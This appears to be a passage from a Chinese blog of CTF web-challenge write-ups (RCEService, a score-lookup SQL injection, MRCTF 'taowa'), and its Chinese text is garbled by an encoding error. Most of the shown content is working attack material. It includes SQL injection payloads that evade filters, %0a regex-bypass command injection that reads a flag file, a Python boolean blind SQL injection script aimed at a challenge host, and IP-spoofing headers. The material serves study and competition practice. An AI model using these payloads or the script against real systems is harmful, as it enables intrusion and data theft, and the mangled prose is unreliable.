åˆ—åæ³¨å…¥æŠ€å·§è·å–å­—æ®µå€¼<br>æ— åˆ—åæ³¨å…¥</p><ol><li><p>å¦‚æœinformation_schemaè¢«WAF,å¾—åˆ°è¡¨åä¹‹åä½¿ç”¨æ— åˆ—åæ³¨å…¥æŠ€å·§è·å–å­—æ®µå€¼.<br><img src="/images/2016410-20200519163717474-1767458536.png"></p></li><li><p>ä¹‹åå°±å¯ä»¥åˆ©ç”¨æ•°å­—æ¥å¯¹åº”ç›¸åº”çš„åˆ—,è¿›è¡ŒæŸ¥è¯¢<br><img src="/images/2016410-20200519164320071-1957869897.png"></p></li></ol><p>â€ƒè¿™é‡Œæœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹:</p><p>1.åˆ—åéœ€è¦ç”¨&#96;&#96;åŒ…è£¹èµ·æ¥<br>2.ä½¿ç”¨å­æŸ¥è¯¢çš„æ—¶å€™,å³ä¸€ä¸ªæŸ¥è¯¢åµŒå¥—åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢ä¸­,å†…å±‚æŸ¥è¯¢çš„ç»“æœå¯ä»¥ä½œä¸ºå¤–å±‚æŸ¥è¯¢çš„æ¡ä»¶,å†…å±‚æŸ¥è¯¢åˆ°çš„ç»“æœéœ€è¦èµ·ä¸€ä¸ªåˆ«å(as)</p><ol start="3"><li>å¦‚æœåå¼•å·&#96;&#96;è¢«è¿‡æ»¤,å¯ä»¥ä½¿ç”¨ä¸ºå­—æ®µèµ·åˆ«åçš„æ–¹å¼.<br><img src="/images/2016410-20200519164947664-637568242.png"><br>ç°åœ¨çš„æ€è·¯å°±æ˜æœ—äº†<br>payload<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,database(),(select/**/group_concat(`<span class="hljs-number">3</span>`)/**/from/**/(select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>/**/as/**/a,<span class="hljs-number">3</span>/**/union/**/select/**/*/**/from/**/users)heihei),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure></li></ol><p>ä»£ç è§£æ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">group_concat</span><span class="hljs-params">(`<span class="hljs-number">3</span>`)</span></span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢è¡¨ç¤ºåˆ—ä¸º3</p><p>heiheiheiè¡¨ç¤ºæ´¾ç”Ÿè¡¨çš„åˆ«åï¼Œåå­—éšæ„<br><img src="/images/I1B1KP1JAETRBPE9A.png"><br><a href="https://blog.csdn.net/m0_46230316/article/details/106668182">æ— åˆ—åæ³¨å…¥æ€»ç»“</a></p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>é¢˜ç›®è¯´è¦ä»¥ JSON æ ¼å¼è¾“å…¥å‘½ä»¤<br>è€ŒJSON éœ€è¦ç»™ä¸€ä¸ªé”®å€¼å¯¹<br>æ ¼å¼ä¸º</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;heiheihei&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å…ˆè¾“å…¥</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ls&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/JOG2DW2SH1II1WFM.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å›æ˜¾ï¼Œé”™è¯¯<br>å°è¯•ä½¿ç”¨{â€œcmdâ€:â€cat index.phpâ€} , è¿”å›: Hacking attempt detected ä¼°è®¡è¿‡æ»¤äº†cat ã€‚<br>dirsearchä»€ä¹ˆéƒ½æ²¡æ‰«å‡ºæ¥<br>çœ‹äº†çœ‹å¤§ä½¬çš„wpï¼Œè¿™é¢˜åº”è¯¥æ˜¯ä¼šç»™æºä»£ç çš„</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;?php<br><br>putenv(&#x27;PATH=/home/rceservice/jail&#x27;);<br><br><span class="hljs-keyword">if</span> (isset($_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>)) &#123;<br>  $json = $_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br><br>  <span class="hljs-keyword">if</span> (!is<span class="hljs-constructor">_string($<span class="hljs-params">json</span>)</span>) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; elseif (preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span>^.<span class="hljs-operator">*</span>(<span class="hljs-params">alias</span>|<span class="hljs-params">bg</span>|<span class="hljs-params">bind</span>|<span class="hljs-params">break</span>|<span class="hljs-params">builtin</span>|<span class="hljs-params">case</span>|<span class="hljs-params">cd</span>|<span class="hljs-params">command</span>|<span class="hljs-params">compgen</span>|<span class="hljs-params">complete</span>|<span class="hljs-params">continue</span>|<span class="hljs-params">declare</span>|<span class="hljs-params">dirs</span>|<span class="hljs-params">disown</span>|<span class="hljs-params">echo</span>|<span class="hljs-params">enable</span>|<span class="hljs-params">eval</span>|<span class="hljs-params">exec</span>|<span class="hljs-params">exit</span>|<span class="hljs-params">export</span>|<span class="hljs-params">fc</span>|<span class="hljs-params">fg</span>|<span class="hljs-params">getopts</span>|<span class="hljs-params">hash</span>|<span class="hljs-params">help</span>|<span class="hljs-params">history</span>|<span class="hljs-params">if</span>|<span class="hljs-params">jobs</span>|<span class="hljs-params">kill</span>|<span class="hljs-params">let</span>|<span class="hljs-params">local</span>|<span class="hljs-params">logout</span>|<span class="hljs-params">popd</span>|<span class="hljs-params">printf</span>|<span class="hljs-params">pushd</span>|<span class="hljs-params">pwd</span>|<span class="hljs-params">read</span>|<span class="hljs-params">readonly</span>|<span class="hljs-params">return</span>|<span class="hljs-params">set</span>|<span class="hljs-params">shift</span>|<span class="hljs-params">shopt</span>|<span class="hljs-params">source</span>|<span class="hljs-params">suspend</span>|<span class="hljs-params">test</span>|<span class="hljs-params">times</span>|<span class="hljs-params">trap</span>|<span class="hljs-params">type</span>|<span class="hljs-params">typeset</span>|<span class="hljs-params">ulimit</span>|<span class="hljs-params">umask</span>|<span class="hljs-params">unalias</span>|<span class="hljs-params">unset</span>|<span class="hljs-params">until</span>|<span class="hljs-params">wait</span>|<span class="hljs-params">while</span>|[\<span class="hljs-params">x00</span>-\<span class="hljs-params">x1FA</span>-Z0-9!#-\<span class="hljs-operator">/</span>;-@\[-`|~\<span class="hljs-params">x7F</span>]+)</span>.*$/&#x27;, $json)) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    echo &#x27;Attempting <span class="hljs-keyword">to</span> run command:&lt;br/&gt;&#x27;;<br>    $cmd = json<span class="hljs-constructor">_decode($<span class="hljs-params">json</span>, <span class="hljs-params">true</span>)</span><span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br>    <span class="hljs-keyword">if</span> ($cmd !== NULL) &#123;<br>      system($cmd);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      echo &#x27;Invalid input&#x27;;<br>    &#125;<br>    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>ä»£ç ä¸­ä½¿ç”¨putenv(â€˜PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jailâ€™); é…ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œè€Œæˆ‘ä»¬ç”¨ä¸äº† cat ä¹Ÿæœ‰å¯èƒ½æ˜¯åœ¨è¿™ä¸ªç¯å¢ƒå˜é‡ä¸‹æ²¡æœ‰è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶</p><p>å› ä¸ºè¿™äº›å‘½ä»¤å®é™…ä¸Šæ˜¯å­˜æ”¾åœ¨ç‰¹å®šç›®å½•ä¸­å°è£…å¥½çš„ç¨‹åºï¼ŒPATHç¯å¢ƒå˜é‡å°±æ˜¯å­˜æ”¾è¿™äº›ç‰¹å®šç›®å½•çš„è·¯å¾„æ–¹ä¾¿æˆ‘ä»¬å»ç›´æ¥è°ƒç”¨è¿™äº›å‘½ä»¤ï¼Œæ‰€ä»¥æ­¤å¤„éƒ¨åˆ†å‘½ä»¤æˆ‘ä»¬å¾—ä½¿ç”¨å…¶å­˜æ”¾çš„ç»å¯¹è·¯å¾„å»è°ƒç”¨</p><p>ç„¶åå°±æ˜¯æ­£åˆ™åŒ¹é…çš„ç»•è¿‡äº†<br>å¯ä»¥æ³¨æ„åˆ°æ­£åˆ™è¡¨è¾¾å¼é‡‡ç”¨äº†^xxx$çš„æ ¼å¼ï¼ŒåŒæ—¶ä¹Ÿé‡‡ç”¨äº†.*è¿™æ ·çš„è´ªå©ªåŒ¹é…ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªæ–¹æ¡ˆæ¥ç»•è¿‡æ­£åˆ™â€”â€”å›æº¯æ¬¡æ•°è¶…é™å’Œåˆ©ç”¨%0aã€‚</p><p>åˆ©ç”¨%0aï¼š%0aå¯¹äº^xxx$è¿™ä¸ªæ ¼å¼çš„ç»•è¿‡å¤ªå¸¸è§äº†ï¼Œåªéœ€è¦æ³¨æ„ä¸‹è¡¨è¾¾å¼ä¸­å­˜åœ¨ä¸€æ®µ</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>-\<span class="hljs-keyword">x</span><span class="hljs-number">1</span>F<br></code></pre></td></tr></table></figure><p>ä¼šåŒ¹é…ä¸€ä¸ª%0aï¼Œä½†å¤šåœ¨payloadå‰ååŠ å‡ ä¸ª%0aå°±è¡Œäº†ã€‚<br><img src="/images/VD0G2K3MS8WJMY0.png"><br><img src="/images/20201203222019541.png"><br>çœ‹çœ‹ç°åœ¨èƒ½ä¸èƒ½è¡Œ</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/QC88QV83GL7BO.png"><br>æ ¹ç›®å½•ä¸­æ²¡æœ‰flag<br>ç”¨findæŸ¥æ‰¾</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰æŠ¥é”™ä½†ä¹Ÿæ²¡æœ‰æ˜¾ç¤ºï¼Œé‚£ä¹ˆè¯´è¿™ä¸ªç¯å¢ƒå˜é‡ä¸‹ä¹Ÿæ²¡æœ‰find</p><p><strong>Linuxå‘½ä»¤çš„ä½ç½®ï¼š&#x2F;bin,&#x2F;usr&#x2F;binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ï¼Œ&#x2F;sbin,&#x2F;usr&#x2F;sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨</strong><br><img src="/images/Q2BO12RTCT42RURJXEVW.png"><br>åœ¨&#x2F;usr&#x2F;binä¸‹æ‰¾åˆ°äº†find<br>è¿™æ ·æ¥ä½¿ç”¨</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/usr/bin/find / -name flag*&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/KXA7MY8AXFZUXW.png"><br>æ‰¾åˆ°äº†flagçš„è·¯å¾„<br><img src="/images/S73VKNZ1Z1VDVZYA.png"><br>æ‰¾åˆ°catçš„è·¯å¾„</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/B4QC95042UQCY2WB.png"><br>å†çœ‹çœ‹ç¯å¢ƒå˜é‡&#x2F;home&#x2F;rceservice&#x2F;jailä¸‹æœ‰ä»€ä¹ˆ<br><img src="/images/XKOFAHMGNI3P7XQAKZOOW.png"><br>æ˜¯lsï¼Œè§£é‡Šäº†ä¸ºå•¥åˆšå¼€å§‹èƒ½ç”¨lsçš„åŸå› </p><h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>åªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†<br>è¾“å…¥1<br>å›æ˜¾Hi admin, your score is: 100<br>æœ€å¤šè¾“åˆ°4<br>ç›²çŒœsqlæ³¨å…¥<br>è¾“å…¥</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ˜¾ç¤ºstudent number not exists.<br>æœ‰å¯èƒ½ç©ºæ ¼æˆ–è€…orè¢«è¿‡æ»¤</p><p>å¤šè½®æµ‹è¯•è¿‡åå‘ç°ä»…ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œç”¨&#x2F;**&#x2F;ä»£æ›¿ç©ºæ ¼å³å¯</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>or<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>å‘ç°è§„å¾‹ï¼Œå‘½ä»¤é”™è¯¯ä¼šæŠ¥é”™<br>ä½¿ç”¨å¸ƒå°”ç›²æ³¨<br>ç¼–å†™pythonè„šæœ¬æ–¹ä¾¿ä½¿ç”¨</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs hsp">import requests<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> True:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) <span class="hljs-comment">// 2</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(schema_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.schemata),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_schema=<span class="hljs-string">&quot;ctf&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&quot;flag&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            payload = f<span class="hljs-string">&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(value)/**/from/**/ctf.flag),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-meta"># print(payload)</span><br>            url = f<span class="hljs-string">&quot;http://ac3f56f2-dc89-4ab5-a066-b6f2d94da972.node5.buuoj.cn:81/?stunum=&#123;payload&#125;&quot;</span><br>            <span class="hljs-meta">#print(url)</span><br>            <span class="hljs-meta"># data=&#123;</span><br>            <span class="hljs-meta"># <span class="hljs-string">&quot;&quot;</span>:f<span class="hljs-string">&quot;admin&#x27; and &#123;payload&#125;#&quot;</span>,</span><br>            <span class="hljs-meta">#</span><br>            <span class="hljs-meta"># &#125;</span><br>            r = requests.get(url=url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> in r.text:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += chr(low)<br>            <span class="hljs-keyword">print</span>(result)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>æºä»£ç é‡Œæ˜¯æœ‰æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿çš„</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;!--<br><span class="hljs-regexp">//</span><span class="hljs-number">1</span>st<br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<span class="hljs-regexp">//</span>å¯ä»¥ç†è§£ä¸ºè·å–è¾“å…¥çš„å­—ç¬¦ä¿¡æ¯,è·å–çš„æ˜¯?åé¢çš„å€¼<br><br> <span class="hljs-keyword">if</span>( substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<span class="hljs-regexp">//</span>substr_countè·å–å­—ç¬¦çš„å‡ºç°æ¬¡æ•°<br>    die(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    echo <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br>!--&gt;<br></code></pre></td></tr></table></figure><p>å¼€å§‹ç»•<br>ä»–æ²¡æœ‰å¤§å°å†™çš„æ£€æµ‹%5fç”¨%5Fç»•è¿‡<br>ä»¥$ç»“å°¾ä¹Ÿæ²¡æœ‰ç¦ç”¨æ¢è¡Œç¬¦ï¼Œå°±ç”¨%0aç»•è¿‡<br>payload</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?b[u<span class="hljs-meta">%</span><span class="hljs-number">5</span>Fp<span class="hljs-meta">%</span><span class="hljs-number">5</span>Ft=<span class="hljs-number">23333</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p><img src="/images/H37HXSCW5QM6ZXX.png"><br>è¿›å…¥å†æºä»£ç å‘ç°ä¸€ä¸ªåŠ å¯†ä¿¡æ¯<br>å¤åˆ¶ç²˜è´´åœ¨æ§åˆ¶å°é‡Œ<br><img src="/images/B8K9LNDE6H7CN95S.png"><br>é‚£ä¹ˆPOST Merak,å€¼éšæ„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>å‡ºç°äº†æ–°çš„æºç <br>ç¬¬ä¸€æ­¥æ˜¯ä¼ªé€ ip<br>æœ‰å¦‚ä¸‹å‡ ç§æ–¹å¼</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Client</span>-ip:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Client-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Remote-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Rriginating-IP:<span class="hljs-number">127.0.0.1</span><br><span 